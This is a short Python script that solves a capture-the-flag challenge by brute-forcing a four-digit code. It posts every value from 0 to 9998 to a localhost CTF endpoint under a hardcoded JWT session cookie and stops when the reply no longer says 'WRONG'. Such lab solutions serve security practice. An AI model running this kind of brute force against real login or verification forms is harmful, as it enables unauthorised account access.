import time
import requests
import string


cookies = {'Auth': 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJlbWFpbCI6ImN0ZjkiLCJpZCI6IjVkNzI1NDc0YmNlZGM4MzA5YmI0YjYxYyIsImV4cCI6MTU3NDA3NDMyNSwiaWF0IjoxNTY4ODg2NzI1fQ.RNUnKRClyZ2zibss2JIFLA7OPt7JH0CZQqT0q6AVRGU'}

for i in range(0000,9999):
    Data = {'text' : i}
    r = requests.post('http://localhost:8000/ctf/ctf9', data=Data, cookies=cookies)
    if('WRONG' in r.text):
        continue
    else:
        print(r.text)
        print(i)
        break